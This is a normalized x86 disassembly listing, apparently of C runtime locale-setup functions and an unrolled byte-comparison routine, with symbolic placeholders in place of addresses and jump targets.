lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_428071
pop ecx
pop ecx
test eax eax
jne r-xdata
or [ esi + 0x8 ] 0x100
push [ esi ]
call sub_4136f0
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
cmp [ esi + 0x18 ] ebx
jne r-xdata
push edi
call sub_41ce80
pop ecx
test eax eax
je r-xdata
push [ esi ]
or [ esi + 0x8 ] 0x2
mov [ esi + 0x1c ] edi
call sub_4136f0
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
push ebx
mov [ esi + 0x18 ] edi
push 0x1
jmp r-xdata
or edx 0x1
mov [ esi + 0x8 ] edx
mov [ esi + 0x18 ] edi
jmp r-xdata
push edi
mov ecx esi
call sub_41cf8b
pop ecx
pop ecx
test eax eax
je r-xdata
sub_41d1d1
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_40e99d
mov esi eax
mov edx edi
add esi 0x9c
call sub_41cea4
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_428071
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] eax
inc eax
jmp r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40b762
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
cmp [ esi + 0xc ] 0x0
je r-xdata
or [ esi + 0x8 ] 0x4
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
push 0x1
jmp r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_428071
pop ecx
pop ecx
test eax eax
jne r-xdata
push edi
mov ecx esi
call sub_41cf8b
pop ecx
pop ecx
test eax eax
je r-xdata
push eax
sub_41d292
push [ esi + 0x4 ]
call sub_4136f0
sub eax 0x3
neg eax
pop ecx
sbb eax eax
push 0x1
inc eax
push sub_41cef3
mov [ esi + 0x14 ] eax
call [ EnumSystemLocalesA@IAT ]
test [ esi + 0x8 ] 0x4
jne r-xdata
retn
and [ esi + 0x8 ] 0x0
sub_41d2be
push [ esi ]
call sub_4136f0
push [ esi + 0x4 ]
sub eax 0x3
neg eax
sbb eax eax
inc eax
mov [ esi + 0x10 ] eax
call sub_4136f0
sub eax 0x3
neg eax
sbb eax eax
and [ esi + 0x18 ] 0x0
inc eax
cmp [ esi + 0x10 ] 0x0
pop ecx
pop ecx
mov [ esi + 0x14 ] eax
je r-xdata
mov edx [ esi ]
call sub_41ced8
push 0x2
pop eax
jmp r-xdata
and [ esi + 0x8 ] 0x0
test eax 0x200
je r-xdata
push 0x1
push sub_41cfff
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
mov eax [ esi + 0x8 ]
test eax 0x100
je r-xdata
test al 0x7
jne r-xdata
retn
sub_41d325
push [ esi ]
call sub_4136f0
sub eax 0x3
neg eax
sbb eax eax
inc eax
pop ecx
mov [ esi + 0x10 ] eax
je r-xdata
mov edx [ esi ]
call sub_41ced8
push 0x2
pop eax
jmp r-xdata
retn
and [ esi + 0x8 ] 0x0
push 0x1
push sub_41d1d1
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
test [ esi + 0x8 ] 0x4
jne r-xdata
sub_41d361
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_40e99d
mov ebx [ ebp + 0x8 ]
mov esi eax
add esi 0x9c
test ebx ebx
jne r-xdata
lea eax [ ebx + 0x40 ]
lea edi [ esi + 0x4 ]
mov [ esi ] ebx
mov [ edi ] eax
test eax eax
je r-xdata
or [ esi + 0x8 ] 0x104
jmp r-xdata
mov eax [ esi ]
and [ esi + 0x8 ] 0x0
test eax eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
call [ GetUserDefaultLCID@IAT ]
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] eax
mov edi [ edi ]
test edi edi
je r-xdata
cmp [ eax ] 0x0
je r-xdata
push edi
push 0x16
push r--data
call sub_41cd66
add esp 0xc
xor eax eax
mov ecx ebx
sub ebx 0xffffff80
neg ecx
sbb ecx ecx
and ecx ebx
mov edi esi
call sub_41cddc
mov edi eax
mov [ ebp + 0x8 ] edi
test edi edi
je r-xdata
mov [ esi + 0x8 ] 0x104
cmp [ edi ] 0x0
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
cmp edi 0xfde8
je r-xdata
push edi
call sub_4136f0
sub eax 0x3
neg eax
pop ecx
sbb eax eax
push 0x1
inc eax
push sub_41cef3
mov [ esi + 0x14 ] eax
call [ EnumSystemLocalesA@IAT ]
test [ esi + 0x8 ] 0x4
jne r-xdata
call sub_41d325
cmp [ eax ] 0x0
je r-xdata
cmp edi 0xfde9
je r-xdata
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x8 ] 0x0
jmp r-xdata
push esi
push 0x40
push r--data
call sub_41cd66
add esp 0xc
test eax eax
je r-xdata
call sub_41d2be
jmp r-xdata
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
mov edi [ edi ]
test edi edi
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
push 0x1
push [ esi + 0x18 ]
call [ IsValidLocale@IAT ]
test eax eax
je r-xdata
call sub_41d325
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
call sub_41d2be
jmp r-xdata
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
mov cx [ esi + 0x18 ]
mov [ eax ] cx
mov cx [ esi + 0x1c ]
mov [ eax + 0x2 ] cx
mov [ eax + 0x4 ] di
xor eax eax
inc eax
jmp r-xdata
mov edi [ GetLocaleInfoA@IAT ]
mov ecx 0x814
cmp [ eax ] cx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push 0x40
push ebx
push 0x1001
push [ esi + 0x18 ]
call edi
test eax eax
je r-xdata
push r--data
push 0x40
push ebx
call sub_4192c8
add esp 0xc
test eax eax
je r-xdata
push 0x40
lea eax [ ebx + 0x40 ]
push eax
push 0x1002
push [ esi + 0x1c ]
call edi
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40d5e2
add esp 0x14
jmp r-xdata
push 0xa
push 0x10
sub ebx 0xffffff80
push ebx
push [ ebp + 0x8 ]
call sub_428214
add esp 0x10
sub_41d57c
mov ax [ esi ]
cmp ax [ ecx ]
je r-xdata
xor eax eax
movzx edx [ ecx ]
movzx eax al
sub eax edx
je r-xdata
movzx eax [ esi + 0x1 ]
movzx ecx [ ecx + 0x1 ]
sub eax ecx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
retn
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
retn
sub_41d5bc
mov eax [ esi ]
cmp eax [ ecx ]
je r-xdata
xor eax eax
movzx edx [ ecx ]
movzx eax al
sub eax edx
je r-xdata
movzx eax [ esi + 0x1 ]
movzx edx [ ecx + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
movzx eax [ esi + 0x2 ]
movzx edx [ ecx + 0x2 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
retn
movzx eax [ esi + 0x3 ]
movzx ecx [ ecx + 0x3 ]
sub eax ecx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
retn
sub_41d634
mov edi edi
push esi
push edi
mov edi eax
jmp r-xdata
cmp edi 0x20
jae r-xdata
mov eax [ ecx ]
cmp eax [ edx ]
je r-xdata
add ecx edi
add edx edi
cmp edi 0x1f
ja r-xdata
xor eax eax
movzx esi al
movzx eax [ edx ]
sub esi eax
je r-xdata
xor eax eax
jmp [ edi * 4 + jump_table_41ea48 ]
pop edi
pop esi
retn
mov eax [ ecx + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
movzx esi [ ecx + 0x1 ]
movzx eax [ edx + 0x1 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax [ ecx - 0x1c ]
cmp eax [ edx - 0x1c ]
je r-xdata
mov eax [ ecx - 0x18 ]
cmp eax [ edx - 0x18 ]
je r-xdata
mov eax [ ecx - 0x14 ]
cmp eax [ edx - 0x14 ]
je r-xdata
mov eax [ ecx - 0x10 ]
cmp eax [ edx - 0x10 ]
je r-xdata
mov eax [ ecx - 0xc ]
cmp eax [ edx - 0xc ]
je r-xdata
mov eax [ ecx - 0x8 ]
cmp eax [ edx - 0x8 ]
je r-xdata
mov eax [ ecx - 0x4 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ecx - 0x1d ]
cmp eax [ edx - 0x1d ]
je r-xdata
mov eax [ ecx - 0x19 ]
cmp eax [ edx - 0x19 ]
je r-xdata
mov eax [ ecx - 0x15 ]
cmp eax [ edx - 0x15 ]
je r-xdata
mov eax [ ecx - 0x11 ]
cmp eax [ edx - 0x11 ]
je r-xdata
mov eax [ ecx - 0xd ]
cmp eax [ edx - 0xd ]
je r-xdata
mov eax [ ecx - 0x9 ]
cmp eax [ edx - 0x9 ]
je r-xdata
mov eax [ ecx - 0x5 ]
cmp eax [ edx - 0x5 ]
je r-xdata
movzx eax [ ecx - 0x1 ]
movzx ecx [ edx - 0x1 ]
sub eax ecx
je r-xdata
mov eax [ ecx - 0x1e ]
cmp eax [ edx - 0x1e ]
je r-xdata
mov eax [ ecx - 0x1a ]
cmp eax [ edx - 0x1a ]
je r-xdata
mov eax [ ecx - 0x16 ]
cmp eax [ edx - 0x16 ]
je r-xdata
mov eax [ ecx - 0x12 ]
cmp eax [ edx - 0x12 ]
je r-xdata
mov eax [ ecx - 0xe ]
cmp eax [ edx - 0xe ]
je r-xdata
mov eax [ ecx - 0xa ]
cmp eax [ edx - 0xa ]
je r-xdata
mov eax [ ecx - 0x6 ]
cmp eax [ edx - 0x6 ]
je r-xdata
mov ax [ ecx - 0x2 ]
cmp ax [ edx - 0x2 ]
je r-xdata
mov eax [ ecx - 0x1f ]
cmp eax [ edx - 0x1f ]
je r-xdata
mov eax [ ecx - 0x1b ]
cmp eax [ edx - 0x1b ]
je r-xdata
mov eax [ ecx - 0x17 ]
cmp eax [ edx - 0x17 ]
je r-xdata
mov eax [ ecx - 0x13 ]
cmp eax [ edx - 0x13 ]
je r-xdata
mov eax [ ecx - 0xf ]
cmp eax [ edx - 0xf ]
je r-xdata
mov eax [ ecx - 0xb ]
cmp eax [ edx - 0xb ]
je r-xdata
mov eax [ ecx - 0x7 ]
cmp eax [ edx - 0x7 ]
je r-xdata
movzx esi [ ecx - 0x3 ]
movzx eax [ edx - 0x3 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx + 0x4 ]
sub esi eax
je r-xdata
movzx esi [ ecx + 0x2 ]
movzx eax [ edx + 0x2 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
xor eax eax
movzx eax [ edx - 0x1c ]
movzx esi [ ecx - 0x1c ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x18 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x14 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x10 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0xc ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x8 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x4 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x1d ]
sub esi eax
je r-xdata
xor eax eax
movzx eax [ edx - 0x19 ]
movzx esi [ ecx - 0x19 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x15 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x11 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0xd ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x9 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x5 ]
sub esi eax
je r-xdata
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x1e ]
sub esi eax
je r-xdata
xor eax eax
movzx eax [ edx - 0x1a ]
movzx esi [ ecx - 0x1a ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x16 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x12 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0xe ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0xa ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x6 ]
sub esi eax
je r-xdata
jmp r-xdata
xor eax eax
movzx eax [ edx - 0x1f ]
movzx esi [ ecx - 0x1f ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x1b ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x17 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x13 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0xf ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0xb ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x7 ]
sub esi eax
je r-xdata
movzx esi [ ecx - 0x2 ]
movzx eax [ edx - 0x2 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp eax [ edx + 0x8 ]
je r-xdata
movzx esi [ ecx + 0x5 ]
movzx eax [ edx + 0x5 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0x3 ]
movzx eax [ edx + 0x3 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1b ]
movzx eax [ edx - 0x1b ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x17 ]
movzx eax [ edx - 0x17 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x13 ]
movzx eax [ edx - 0x13 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xf ]
movzx eax [ edx - 0xf ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xb ]
movzx eax [ edx - 0xb ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x7 ]
movzx eax [ edx - 0x7 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x3 ]
movzx eax [ edx - 0x3 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1c ]
movzx eax [ edx - 0x1c ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x18 ]
movzx eax [ edx - 0x18 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x14 ]
movzx eax [ edx - 0x14 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x10 ]
movzx eax [ edx - 0x10 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xc ]
movzx eax [ edx - 0xc ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x8 ]
movzx eax [ edx - 0x8 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x4 ]
movzx eax [ edx - 0x4 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1d ]
movzx eax [ edx - 0x1d ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x19 ]
movzx eax [ edx - 0x19 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x15 ]
movzx eax [ edx - 0x15 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x11 ]
movzx eax [ edx - 0x11 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xd ]
movzx eax [ edx - 0xd ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x9 ]
movzx eax [ edx - 0x9 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x5 ]
movzx eax [ edx - 0x5 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1e ]
movzx eax [ edx - 0x1e ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1a ]
movzx eax [ edx - 0x1a ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x16 ]
movzx eax [ edx - 0x16 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x12 ]
movzx eax [ edx - 0x12 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xe ]
movzx eax [ edx - 0xe ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xa ]
movzx eax [ edx - 0xa ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x6 ]
movzx eax [ edx - 0x6 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
jmp r-xdata
xor eax eax
movzx esi al
movzx eax [ edx + 0x8 ]
sub esi eax
je r-xdata
movzx esi [ ecx + 0x6 ]
movzx eax [ edx + 0x6 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
movzx esi [ ecx - 0x1a ]
movzx eax [ edx - 0x1a ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x16 ]
movzx eax [ edx - 0x16 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x12 ]
movzx eax [ edx - 0x12 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xe ]
movzx eax [ edx - 0xe ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xa ]
movzx eax [ edx - 0xa ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x6 ]
movzx eax [ edx - 0x6 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x2 ]
movzx eax [ edx - 0x2 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1b ]
movzx eax [ edx - 0x1b ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x17 ]
movzx eax [ edx - 0x17 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x13 ]
movzx eax [ edx - 0x13 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xf ]
movzx eax [ edx - 0xf ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xb ]
movzx eax [ edx - 0xb ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x7 ]
movzx eax [ edx - 0x7 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x3 ]
movzx eax [ edx - 0x3 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1c ]
movzx eax [ edx - 0x1c ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x18 ]
movzx eax [ edx - 0x18 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x14 ]
movzx eax [ edx - 0x14 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x10 ]
movzx eax [ edx - 0x10 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xc ]
movzx eax [ edx - 0xc ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x8 ]
movzx eax [ edx - 0x8 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x4 ]
movzx eax [ edx - 0x4 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1d ]
movzx eax [ edx - 0x1d ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x19 ]
movzx eax [ edx - 0x19 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x15 ]
movzx eax [ edx - 0x15 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x11 ]
movzx eax [ edx - 0x11 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xd ]
movzx eax [ edx - 0xd ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x9 ]
movzx eax [ edx - 0x9 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x5 ]
movzx eax [ edx - 0x5 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov eax [ ecx + 0xc ]
cmp eax [ edx + 0xc ]
je r-xdata
movzx esi [ ecx + 0x9 ]
movzx eax [ edx + 0x9 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0x7 ]
movzx eax [ edx + 0x7 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
movzx esi [ ecx - 0x19 ]
movzx eax [ edx - 0x19 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x15 ]
movzx eax [ edx - 0x15 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x11 ]
movzx eax [ edx - 0x11 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xd ]
movzx eax [ edx - 0xd ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x9 ]
movzx eax [ edx - 0x9 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x5 ]
movzx eax [ edx - 0x5 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx eax [ ecx - 0x1 ]
movzx ecx [ edx - 0x1 ]
sub eax ecx
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1a ]
movzx eax [ edx - 0x1a ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x16 ]
movzx eax [ edx - 0x16 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x12 ]
movzx eax [ edx - 0x12 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
